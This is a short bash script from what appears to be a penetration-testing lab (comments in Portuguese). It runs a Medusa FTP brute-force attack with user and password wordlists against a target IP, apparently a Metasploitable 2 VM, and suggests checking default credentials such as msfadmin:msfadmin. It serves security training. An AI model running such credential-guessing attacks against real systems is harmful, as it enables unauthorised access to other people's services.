#!/bin/bash
# Cenário 1 - FTP Brute Force com Medusa - Lab riad
# Uso: ./commands/ftp-medusa.sh 192.168.56.101 (a partir da raiz do repo)
BASEDIR="$(cd "$(dirname "$0")/.." && pwd)"
WORDLIST_U="$BASEDIR/wordlists/users.txt"
WORDLIST_P="$BASEDIR/wordlists/passwords.txt"
IP_MS2="${1:-<IP-MS2>}"
echo "[*] FTP brute force contra $IP_MS2"
medusa -h "$IP_MS2" -U "$WORDLIST_U" -P "$WORDLIST_P" -M ftp -v 6
echo ""
echo "[*] Validar acesso encontrado (ex: msfadmin:msfadmin):"
echo "ftp $IP_MS2"
